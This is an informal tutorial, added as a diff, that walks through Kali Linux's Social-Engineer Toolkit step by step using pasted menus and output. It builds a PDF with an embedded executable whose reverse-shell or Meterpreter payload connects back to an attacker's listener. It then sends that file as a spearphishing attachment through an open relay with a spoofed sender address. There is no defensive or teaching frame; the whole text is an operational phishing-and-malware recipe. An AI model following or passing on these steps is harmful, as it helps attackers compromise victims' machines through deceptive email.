@@ -1,0 +1,220 @@
+change the kali into root
+
+# sudo su
+
+enter passwd "kali"
+
+start by cmd
+
+# setoolkit
+
+          _______________________________
+         /   _____/\_   _____/\__    ___/
+         \_____  \  |    __)_   |    |
+         /        \ |        \  |    |
+        /_______  //_______  /  |____|
+                \/         \/
+
+[---] The Social-Engineer Toolkit (SET) [---]
+[---] Created by: David Kennedy (ReL1K) [---]
+Version: 8.0.3
+Codename: 'Maverick'
+[---] Follow us on Twitter: @TrustedSec [---]
+[---] Follow me on Twitter: @HackingDave [---]
+[---] Homepage: https://www.trustedsec.com [---]
+Welcome to the Social-Engineer Toolkit (SET).
+The one stop shop for all of your SE needs.
+
+The Social-Engineer Toolkit is a product of TrustedSec.
+
+           Visit: https://www.trustedsec.com
+
+It's easy to update using the PenTesters Framework! (PTF)
+Visit https://github.com/trustedsec/ptf to update all your tools!
+
+Select from the menu:
+
+1.  Social-Engineering Attacks
+2.  Penetration Testing (Fast-Track)
+3.  Third Party Modules
+4.  Update the Social-Engineer Toolkit
+5.  Update SET configuration
+6.  Help, Credits, and About
+
+7.  Exit the Social-Engineer Toolkit
+
+# select the SOCIAL ENGINEERING ATTACKS BY numerical 1,
+
+    !\_________________________/!\
+          !!                         !! \
+          !! Social-Engineer Toolkit !!  \
+          !!                         !!  !
+          !!          Free           !!  !
+          !!                         !!  !
+          !!          #hugs          !!  !
+          !!                         !!  !
+          !!      By: TrustedSec     !!  /
+          !!_________________________!! /
+          !/_________________________\!/
+             __\_________________/__/!_
+            !_______________________!/
+          ________________________
+         /oooo  oooo  oooo  oooo /!
+        /ooooooooooooooooooooooo/ /
+       /ooooooooooooooooooooooo/ /
+      /C=_____________________/_/
+
+[---] The Social-Engineer Toolkit (SET) [---]
+[---] Created by: David Kennedy (ReL1K) [---]
+Version: 8.0.3
+Codename: 'Maverick'
+[---] Follow us on Twitter: @TrustedSec [---]
+[---] Follow me on Twitter: @HackingDave [---]
+[---] Homepage: https://www.trustedsec.com [---]
+Welcome to the Social-Engineer Toolkit (SET).
+The one stop shop for all of your SE needs.
+
+The Social-Engineer Toolkit is a product of TrustedSec.
+
+           Visit: https://www.trustedsec.com
+
+It's easy to update using the PenTesters Framework! (PTF)
+Visit https://github.com/trustedsec/ptf to update all your tools!
+
+Select from the menu:
+
+# select the type of attack as in numerical ,1
+
+set1> The Spearphishing module allows you to specially craft email messages and send
+them to a large (or small) number of people with attached fileformat malicious
+payloads. If you want to spoof your email address, be sure "Sendmail" is in-
+stalled (apt-get install sendmail) and change the config/set_config SENDMAIL=OFF
+flag to SENDMAIL=ON.
+
+There are two options, one is getting your feet wet and letting SET do
+everything for you (option 1), the second is to create your own FileFormat
+payload and use it in your own attack. Either way, good luck and enjoy!
+
+1.  Perform a Mass Email Attack
+2.  Create a FileFormat Payload
+3.  Create a Social-Engineering Template
+
+4.  Return to Main Menu
+
+select what you want to, 2
+
+# set:phishing>2
+
+/usr/bin/
+
+Select the file format exploit you want.
+The default is the PDF embedded EXE.
+
+           ********** PAYLOADS **********
+
+1.  SET Custom Written DLL Hijacking Attack Vector (RAR, ZIP)
+2.  SET Custom Written Document UNC LM SMB Capture Attack
+3.  MS15-100 Microsoft Windows Media Center MCL Vulnerability
+4.  MS14-017 Microsoft Word RTF Object Confusion (2014-04-01)
+5.  Microsoft Windows CreateSizedDIBSECTION Stack Buffer Overflow
+6.  Microsoft Word RTF pFragments Stack Buffer Overflow (MS10-087)
+7.  Adobe Flash Player "Button" Remote Code Execution
+8.  Adobe CoolType SING Table "uniqueName" Overflow
+9.  Adobe Flash Player "newfunction" Invalid Pointer Use
+10. Adobe Collab.collectEmailInfo Buffer Overflow
+11. Adobe Collab.getIcon Buffer Overflow
+12. Adobe JBIG2Decode Memory Corruption Exploit
+13. Adobe PDF Embedded EXE Social Engineering
+14. Adobe util.printf() Buffer Overflow
+15. Custom EXE to VBA (sent via RAR) (RAR required)
+16. Adobe U3D CLODProgressiveMeshDeclaration Array Overrun
+17. Adobe PDF Embedded EXE Social Engineering (NOJS)
+18. Foxit PDF Reader v4.1.1 Title Stack Buffer Overflow
+19. Apple QuickTime PICT PnSize Buffer Overflow
+20. Nuance PDF Reader v6.0 Launch Stack Buffer Overflow
+21. Adobe Reader u3D Memory Corruption Vulnerability
+22. MSCOMCTL ActiveX Buffer Overflow (ms12-027)
+
+set:payloads> select the payload what you want to
+
+# set:payloads>13
+
+[-] Default payload creation selected. SET will generate a normal PDF with embedded EXE.
+
+    1. Use your own PDF for attack
+    2. Use built-in BLANK PDF for attack
+
+set:payloads> 1
+
+set:payloads>1
+set:payloads> Enter path to your pdf [blank-builtin]:
+[-] Defaulting to BLANK PDF built into SET...
+
+1.  Windows Reverse TCP Shell Spawn a command shell on victim and send back to attacker
+2.  Windows Meterpreter Reverse_TCP Spawn a Meterpreter shell on victim and send back to attacker
+3.  Windows Reverse VNC DLL Spawn a VNC server on victim and send back to attacker
+4.  Windows Reverse TCP Shell (x64) Windows X64 Command Shell, Reverse TCP Inline
+5.  Windows Meterpreter Reverse_TCP (X64) Connects back to the attacker (Windows x64), Meterpreter
+6.  Windows Shell Bind_TCP (X64) Execute payload and create an accepting port on remote system
+7.  Windows Meterpreter Reverse HTTPS Tunnel communication over HTTP using SSL and use Meterpreter
+
+set:payloads>
+set> IP address or URL (www.ex.com) for the payload listener (LHOST) [10.0.2.15]:
+set:payloads> Port to connect back on [443]:
+[-] Defaulting to port 443...
+[*] All good! The directories were created.
+[-] Generating fileformat exploit...
+[*] Waiting for payload generation to complete (be patient, takes a bit)...
+
+[*] Waiting for payload generation to complete (be patient, takes a bit)...
+[*] Waiting for payload generation to complete (be patient, takes a bit)...
+[*] Payload creation complete.
+[*] All payloads get sent to the template.pdf directory
+[*] If you are using GMAIL - you will need to create an application password: https://support.google.com/accounts/answer/6010255?hl=en
+[-] As an added bonus, use the file-format creator in SET to create your attachment.
+
+Right now the attachment will be imported with filename of 'template.whatever'
+
+Do you want to rename the file?
+
+example Enter the new filename: moo.pdf
+
+    1. Keep the filename, I don't care.
+    2. Rename the file, I want to be cool.
+
+set:phishing>[*] Keeping the filename and moving on.
+
+Social Engineer Toolkit Mass E-Mailer
+
+There are two options on the mass e-mailer, the first would
+be to send an email to one individual person. The second option
+will allow you to import a list and send it to as many people as
+you want within that list.
+
+What do you want to do:
+
+1.  E-Mail Attack Single Email Address
+2.  E-Mail Attack Mass Mailer
+
+3.  Return to main menu.
+
+set:phishing>
+
+1. Use a gmail Account for your email attack.
+2. Use your own server or open relay
+
+set:phishing>2  
+set:phishing> From address (ex: moo@example.com):
+set:phishing> The FROM NAME user will see:
+set:phishing> Username for open-relay [blank]:
+Password for open-relay [blank]:
+set:phishing> SMTP email server address (ex. smtp.youremailserveryouown.com):
+set:phishing> Port number for the SMTP server [25]:
+set:phishing> Flag this message/s as high priority? [yes|no]:
+[!] valid responses are 'n|y|N|Y|no|yes|No|Yes|NO|YES'
+set:phishing> Flag this message/s as high priority? [yes|no]:
+[!] valid responses are 'n|y|N|Y|no|yes|No|Yes|NO|YES'
+set:phishing> Flag this message/s as high priority? [yes|no]: yes
+[*] SET has finished delivering the emails
+
+SOME LEFT WITH BLANK , Users perform according to their type of attack, I left blank
